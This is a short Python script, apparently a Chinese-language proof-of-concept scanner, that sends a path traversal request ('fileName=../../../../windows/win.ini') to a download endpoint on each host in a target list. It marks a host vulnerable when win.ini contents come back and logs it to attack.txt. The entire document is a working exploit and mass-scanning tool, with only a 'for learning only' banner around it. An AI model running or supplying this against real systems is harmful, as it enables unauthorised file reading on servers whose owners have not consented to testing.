
import requests
import concurrent.futures
banner='''
-----------------------------
    _              _             
   / \   _ __ ___ (_) ___ __ _   
  / _ \ | '_ ` _ \| |/ __/ _` |  
 / ___ \| | | | | | | (_| (_| |_ 
/_/   \_\_| |_| |_|_|\___\__,_(_)
    +                          此脚本仅用于学习                          +
Author  :   Amica安全攻防
-----------------------------
'''

def check_vulnerability(target):
    headers = {
   
        "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
        "Content-Length":"0"
       }

    try:
        # print(target)
        res = requests.get(f"{target}/register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini", headers=headers, timeout=5,verify=False)
        if "extensions"in res.text and "CMCDLLNAME32" in res.text:
            print(f"[+]{target}漏洞存在")
            with open("attack.txt",'a') as fw:
                fw.write(f"{target}\n")
        else:
            print(f"[-]{target}漏洞不存在")
    except Exception as e:
        print(f"[-]{target}访问错误")

if __name__ == "__main__":
    print("------------------------")
    print("CSDN:Amica.")
    print("------------------------")
    print("target.txt存放目标文件")
    print("attack.txt存放检测结果")
    print("------------------------")
    print("按回车继续")
    import os
    os.system("pause")
    f = open("target.txt", 'r')
    targets = f.read().splitlines()
    print(targets)

    # 使用线程池并发执行检查漏洞
    with concurrent.futures.ThreadPoolExecutor(max_workers=1) as executor:
        executor.map(check_vulnerability, targets)